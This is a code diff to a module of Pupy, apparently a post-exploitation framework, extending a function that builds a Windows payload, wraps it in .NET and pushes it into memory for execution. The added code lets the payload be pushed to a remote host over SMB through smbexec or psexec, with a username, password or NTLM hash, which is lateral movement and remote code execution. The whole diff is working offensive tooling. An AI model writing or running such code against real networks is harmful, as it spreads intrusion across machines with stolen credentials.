@@ -1,5 +1,9 @@
 # -*- encoding: utf-8 -*-
 
+__all__ = (
+    'serve'
+)
+
 from os import unlink
 from threading import Event
 
@@ -8,13 +12,17 @@ from pupylib.payloads.dotnet import DotNetPayload
 
 DEFAULT_TIMEOUT = 90
 
-def serve(module, payload_config, timeout=DEFAULT_TIMEOUT):
-    # Use native arch
+def serve(
+    module, payload_config, timeout=DEFAULT_TIMEOUT,
+    host=None, port=445, user=None, domain=None, password=None,
+    ntlm=None, execm='smbexec', arch=None):
 
-    os_arch = module.client.arch
+    if arch is None:
+        # Use native arch
+        arch = module.client.arch
 
     payload, tpl, _ = generate_binary_from_template(
-        module.log, payload_config, 'windows', arch=os_arch, shared=True
+        module.log, payload_config, 'windows', arch=arch, shared=True
     )
 
     module.success(
@@ -33,20 +41,37 @@ def serve(module, payload_config, timeout=DEFAULT_TIMEOUT):
 
     module.success("Wrapped .NET payload - size={}".format(len(dotnet_payload)))
 
-    module.client.load_package('powerloader')
-    push_payload = module.client.remote('powerloader', 'push_payload', False)
+    push_payload = None
+
+    if host is None:
+        module.client.load_package('powerloader')
+        push_payload = module.client.remote('powerloader', 'push_payload', False)
+    else:
+        module.client.load_package('pupyutils.psexec')
+        pupy_smb_exec = module.client.remote('pupyutils.psexec', 'pupy_smb_exec', False)
+
+        def _push_payload(payload, timeout=90, log_cb=None):
+            return pupy_smb_exec(
+                host, port, user, domain, password, ntlm, payload,
+                execm=execm, timeout=timeout, log_cb=log_cb)
+
+        push_payload = _push_payload
 
     completion = Event()
 
     def _power_logger(result, info):
+        hostinfo = ''
+        if host is not None:
+            hostinfo = ' ({})'.format(host)
+
         if result is None:
-            module.info('PowerLoader: '+info)
+            module.info('PowerLoader{}: {}'.format(hostinfo, info))
             return
 
         if result is False:
-            module.error('PowerLoader: '+info)
+            module.error('PowerLoader{}: {}'.format(hostinfo, info))
         elif result is True:
-            module.success('PowerLoader: '+info)
+            module.success('PowerLoader{}: {}'.format(hostinfo, info))
 
         if completion:
             completion.set()
